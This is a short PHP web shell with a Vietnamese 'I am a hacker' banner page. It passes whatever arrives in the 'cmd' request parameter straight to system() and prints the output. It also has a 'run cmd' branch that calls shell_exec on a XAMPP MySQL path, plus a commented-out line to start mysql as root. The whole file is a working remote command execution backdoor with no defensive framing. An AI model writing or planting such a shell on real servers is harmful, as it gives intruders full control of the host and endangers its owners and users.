<?php
$v = '';
if(isset($_REQUEST['cmd'])) {
	echo '<pre>';
	$cmd = $_REQUEST['cmd'];
	if ($cmd) {
		$v = $cmd;
	}elseif ($cmd == 0) {
		$v = 'kết nối thành công';
	} else {
		$v = 'kết nối không thành công';
	}
	
	$lookup = system($cmd);
	echo($lookup);
	$run = 'run cmd';
	if ($cmd == $run) {
		$lik = shell_exec('start cd C:\xampp\mysql\bin');
// $lik = shell_exec('start cd mysql.exe -h localhost -u root');
		echo '<pre>';
		echo($lik);
		echo '</pre>';
	}
	echo '</pre>';
}else {
	$v = "Xin chào! Tôi là hacker";
}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<style>
		*{
			margin: 0px;
			padding: 0px;
		}
		body{
			background:url(https://img2.thuthuatphanmem.vn/uploads/2018/12/09/anh-hacker-tan-bien_111114434.jpg) center fixed;
				text-align: center;
				color:#ffffff;
				font-size: 80px;
			}
			div{
				margin-top: 300px;
			}
			#box {
				width: 810px;
				height: 90px;
				background: red;
				transition: margin-left 2s, background-color 1s;
				-moz-transition: margin-left 2s, background-color 1s;
				-webkit-transition: margin-left 2s, background-color 1s;

			}
			#box:hover {
				margin-left: 500px;
				background-color: blue;
			}
		</style>
	</head>
	<body>
		<div id="box">
			<?php echo $v;?>
		</div>
	</body>
	</html>